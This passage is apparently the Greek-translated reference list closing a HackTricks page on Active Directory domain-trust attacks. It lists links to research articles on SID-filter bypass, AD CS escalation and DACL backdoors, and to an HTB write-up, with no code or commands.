- [11] [Ένα ταξίδι στις ξεχασμένες διεπαφές Null Session και MS-RPC](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Το SID filter ως όριο ασφαλείας μεταξύ domains; (Μέρος 4) - Έρευνα παράκαμψης SID filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Το SID filter ως όριο ασφαλείας μεταξύ domains; (Μέρος 5) - Επίθεση trust με Golden GMSA - από child σε parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Το SID filter ως όριο ασφαλείας μεταξύ domains; (Μέρος 6) - Επίθεση trust μέσω αλλαγής Schema - από child σε parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Από DA σε EA με ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Κλιμάκωση από admins child domain σε enterprise admins σε 5 λεπτά μέσω κατάχρησης του AD CS, συνέχεια](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Ένας ACE στο μανίκι: Σχεδιασμός Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Πηγαίος κώδικας της ενότητας pre2k του NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - attribute msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
